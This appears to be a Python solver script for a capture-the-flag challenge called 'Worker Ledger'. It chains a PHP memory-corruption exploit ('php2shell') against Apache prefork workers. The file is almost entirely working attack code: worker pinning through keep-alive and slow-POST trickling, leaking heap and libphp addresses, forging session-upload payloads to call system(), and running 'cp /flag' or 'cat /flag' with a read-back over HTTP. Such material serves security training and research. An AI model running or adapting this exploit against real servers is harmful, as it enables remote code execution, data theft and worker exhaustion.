#!/usr/bin/env python3
"""Worker Ledger solver v2.

Pins one prefork child with a keep-alive connection, then drives the php2shell
8.5.11 chain on the remaining free child.  Stage 3 tries a write-out command
first (`cp /flag /e/p1`) and reads the file back over HTTP, which does not
depend on capturing system() stdout; `cat /flag` is the fallback.

Usage:
  python wl_solve2.py <host> <port> [--no-pin] [--cmd "cat /flag"]
"""
import argparse
import os
import random
import socket
import struct
import sys
import threading
import time
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..", "_dl", "php2shell")))
import exploit as P  # noqa: E402

ZIF_OFF = 0x5996E0
DTOR_OFF = 0x7B47A0
HTDATA_OFF = 0x690D8
MAX_CMD = 14


# ---------------------------------------------------------------- leak parsing
def _ptr(v):
    return 0x1000000000 <= v < 0x800000000000


def chunk_base_generic(raw: bytes, min_votes: int = 8) -> int:
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if _ptr(v):
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= min_votes else 0


def libphp_base_generic(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not _ptr(p) or (p & 0xFFF) != (dtor_offset & 0xFFF):
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


P.chunk_base_from_cookie = chunk_base_generic


def stage3_custom(ex, htdata: int, zif: int, sid_a: bytes, sid_b: bytes) -> None:
    """Copy of exploit.Exploit.stage3 with parameterised session ids."""
    parts = [
        {"name": "PHPSESSID", "data": sid_a},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(ex.stage3_pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts.append({"name": name, "data": b"V" * vl})
    parts += [ex._file_part(), ex._big_field()]
    extra = {"Cookie": "PHPSESSID=" + "a" * 32} if ex.stage3_carrier else None
    ex.t.post(P.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
              timeout=max(90.0, ex.t.timeout), extra_headers=extra)
    time.sleep(0.3)

    ht, _ref = ex._fake_payload(htdata, zif)
    parts = [
        {"name": "PHPSESSID", "data": sid_b},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    if ex.stage3_carrier:
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
        parts.append({"name": "g00", "data": carrier})
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    else:
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": _ref})
    ex.t.post(P.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)
P.libphp_base_from_cookie = libphp_base_generic


# ---------------------------------------------------------------- http helper
def recv_response(sock):
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = sock.recv(65536)
        if not d:
            return buf, b""
        buf += d
    head, rest = buf.split(b"\r\n\r\n", 1)
    n, chunked = 0, False
    for line in head.split(b"\r\n")[1:]:
        k, _, v = line.partition(b":")
        k = k.strip().lower()
        if k == b"content-length":
            n = int(v.strip())
        elif k == b"transfer-encoding" and b"chunked" in v.lower():
            chunked = True
    if chunked:
        body = b""
        while True:
            while b"\r\n" not in rest:
                d = sock.recv(65536)
                if not d:
                    return head, body
                rest += d
            line, rest = rest.split(b"\r\n", 1)
            size = int(line.split(b";")[0], 16)
            if size == 0:
                return head, body
            while len(rest) < size + 2:
                rest += sock.recv(65536)
            body += rest[:size]
            rest = rest[size + 2:]
    body = rest
    while len(body) < n:
        d = sock.recv(65536)
        if not d:
            break
        body += d
    return head, body[:n]


def dechunk(raw: bytes) -> bytes:
    head, _, rest = raw.partition(b"\r\n\r\n")
    out = b""
    while True:
        if b"\r\n" not in rest:
            return out or rest
        line, rest = rest.split(b"\r\n", 1)
        try:
            size = int(line.split(b";")[0], 16)
        except ValueError:
            return rest
        if size == 0:
            return out
        if len(rest) < size:
            return out
        out += rest[:size]
        rest = rest[size + 2:]


class Blocker(threading.Thread):
    """Hold one prefork child on a keep-alive connection."""

    def __init__(self, host, port, interval=3.0):
        super().__init__(daemon=True)
        self.host, self.port, self.interval = host, port, interval
        self.sock = None
        self.pid = None
        self.stopped = threading.Event()

    def _conn(self):
        s = socket.create_connection((self.host, self.port), timeout=10)
        s.settimeout(10)
        return s

    def _get(self, path):
        self.sock.sendall((f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                           "Connection: keep-alive\r\n\r\n").encode())
        return recv_response(self.sock)[1]

    def run(self):
        try:
            self.sock = self._conn()
            self.pid = int(self._get("/worker.php").strip())
        except Exception as e:
            print("[blocker] init failed:", repr(e), flush=True)
            return
        while not self.stopped.is_set():
            if self.stopped.wait(self.interval):
                break
            try:
                self._get("/healthz.php")
            except Exception as e:
                print("[blocker] reconnect after:", repr(e), flush=True)
                try:
                    self.sock.close()
                except Exception:
                    pass
                try:
                    self.sock = self._conn()
                    self.pid = int(self._get("/worker.php").strip())
                except Exception as e2:
                    print("[blocker] reconnect failed:", repr(e2), flush=True)
                    time.sleep(1)

    def stop(self):
        self.stopped.set()


class SlowPostBlocker(threading.Thread):
    """Occupy one prefork child by trickling an endless POST body.

    Unlike a keep-alive socket (which the child releases back to the accept
    loop between requests, and which NAT/relay idle timeouts can kill), this
    keeps the child blocked in the request-body read for as long as we trickle
    bytes.  Debian's mod_reqtimeout body MinRate is 500 B/s, so stay above it.
    """

    def __init__(self, host, port, rate=2048, period=0.5):
        super().__init__(daemon=True)
        self.host, self.port = host, port
        self.rate, self.period = rate, period
        self.stopped = threading.Event()
        self.ok = threading.Event()

    def run(self):
        try:
            s = socket.create_connection((self.host, self.port), timeout=10)
            s.settimeout(15)
            total = 400 * 1024 * 1024
            s.sendall((f"POST /healthz.php HTTP/1.1\r\nHost: {self.host}\r\n"
                       "Content-Type: application/octet-stream\r\n"
                       f"Content-Length: {total}\r\nConnection: close\r\n\r\n").encode())
            self.ok.set()
        except Exception as e:
            print("[slowpin] connect failed:", repr(e), flush=True)
            return
        chunk = b"Z" * self.rate
        while not self.stopped.is_set():
            try:
                s.sendall(chunk)
            except Exception as e:
                print("[slowpin] send failed:", repr(e), flush=True)
                return
            if self.stopped.wait(self.period):
                break
        try:
            s.close()
        except Exception:
            pass

    def stop(self):
        self.stopped.set()


class TrackTarget(P.Target):
    last = b""

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        r = super().post(body, boundary, read_cap=read_cap, timeout=timeout,
                         extra_headers=extra_headers)
        self.last = r
        return r


def free_pid(host, port):
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(b"GET /worker.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    try:
        return recv_response(s)[1].strip().decode(errors="replace")
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--no-pin", action="store_true")
    ap.add_argument("--cmd", default="")
    ap.add_argument("--tries", type=int, default=5)
    ap.add_argument("--huge", type=int, default=12, help="MB for the OOM field")
    ap.add_argument("--pin", choices=("keepalive", "slow"), default="keepalive")
    ap.add_argument("--chunk", default="", help="skip stage1 with a known chunk base")
    ap.add_argument("--lib", default="", help="skip stage2 with a known libphp base")
    ap.add_argument("--no-rotate", action="store_true", help="keep the same worker across stages")
    ap.add_argument("--sid-a", default="", help="override stage3 producer session id (19 chars)")
    ap.add_argument("--sid-b", default="", help="override stage3 consumer session id (19 chars)")
    args = ap.parse_args()

    host, port = args.host, args.port
    blocker = None
    if not args.no_pin:
        if args.pin == "slow":
            blocker = SlowPostBlocker(host, port)
            blocker.start()
            if not blocker.ok.wait(15):
                raise SystemExit("slowpin failed to start")
            time.sleep(1.0)
            pids = [free_pid(host, port) for _ in range(3)]
            print(f"[*] slowpin held a child; free pids={pids}", flush=True)
            if len(set(pids)) != 1:
                print("[!] warning: free worker pid not stable", flush=True)
        else:
            blocker = Blocker(host, port)
            blocker.start()
            for _ in range(100):
                if blocker.pid is not None:
                    break
                time.sleep(0.1)
            if blocker.pid is None:
                raise SystemExit("blocker failed to pin a worker")
            print(f"[*] pinned pid={blocker.pid}; free pid={free_pid(host, port)}", flush=True)

    t = TrackTarget(f"http://{host}:{port}/index.php", timeout=60.0, verbose=True)
    ex = P.Exploit(t, "cat /flag", P.PROFILES["official"], zif_offset=ZIF_OFF,
                   dtor_offset=DTOR_OFF, htdata_offset=HTDATA_OFF, huge_mb=args.huge,
                   verbose=True)

    def rotate():
        if args.no_rotate:
            return
        ex.rotate()
        time.sleep(0.4)

    print("[*] pre-rotate", flush=True)
    rotate()

    chunk = int(args.chunk, 0) if args.chunk else 0
    for attempt in range(1, 6 if not chunk else 1):
        print(f"[*] stage1 attempt {attempt}", flush=True)
        chunk = ex.stage1()
        print(f"    cookie_len={len(P.parse_cookie(t.last or b''))}", flush=True)
        if chunk:
            break
        rotate()
    if not chunk:
        raise SystemExit("stage1 FAILED")
    print(f"[+] chunk = 0x{chunk:x}", flush=True)
    rotate()

    lib = int(args.lib, 0) if args.lib else 0
    for attempt in range(1, 6 if not lib else 1):
        print(f"[*] stage2 attempt {attempt}", flush=True)
        lib = ex.stage2()
        print(f"    cookie_len={len(P.parse_cookie(t.last or b''))}", flush=True)
        if lib:
            break
        rotate()
    if not lib:
        raise SystemExit("stage2 FAILED")
    print(f"[+] libphp = 0x{lib:x}", flush=True)
    rotate()

    htdata, zif = chunk + HTDATA_OFF, lib + ZIF_OFF
    print(f"[*] htdata=0x{htdata:x} zif=0x{zif:x}", flush=True)

    # Apache's cwd is the DocumentRoot (/var/www/html), so a 14-byte command can
    # still write into the world-writable export dir: "cp /flag e/xxxx".
    exfil_name = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(3))
    cands = []
    if args.cmd:
        cands.append((args.cmd, None))
    else:
        cands += [(f"cp /flag e/{exfil_name}", f"/e/{exfil_name}"), ("cat /flag", None)]
    for cmd, exfil in cands:
        if len(cmd) > MAX_CMD:
            print(f"[!] command too long ({len(cmd)}>{MAX_CMD}): {cmd!r}", flush=True)
            continue
        print(f"[*] stage3 cmd={cmd!r} tries={args.tries}", flush=True)
        for attempt in range(1, args.tries + 1):
            ex.cmd = cmd.encode()
            try:
                if args.sid_a or args.sid_b:
                    stage3_custom(ex, htdata, zif,
                                  args.sid_a.encode() if args.sid_a else b"a" * 19,
                                  args.sid_b.encode() if args.sid_b else P.SID)
                else:
                    ex.stage3(htdata, zif)
            except Exception as e:
                print(f"    stage3 exception: {e!r}", flush=True)
            time.sleep(0.5)
            body = dechunk(t.last or b"")
            printable = (body.strip() and b"Fatal error" not in body and b"Warning" not in body
                         and b"<html" not in body.lower() and b"Worker Ledger" not in body)
            print(f"    attempt {attempt}: resp={len(t.last or b'')}B body={body[:120]!r}", flush=True)
            if printable:
                print("[+] OUTPUT:", body.decode("latin1", "replace"), flush=True)
                return 0
            if exfil:
                st, fb = t.get(exfil)
                if st == 200 and fb.strip():
                    print(f"[+] {exfil} -> {fb!r}", flush=True)
                    print("[+] OUTPUT:", fb.decode("latin1", "replace"), flush=True)
                    return 0
                print(f"    exfil check {exfil}: status={st} len={len(fb)}", flush=True)
            rotate()
    raise SystemExit("exploit FAILED")


if __name__ == "__main__":
    sys.exit(main())
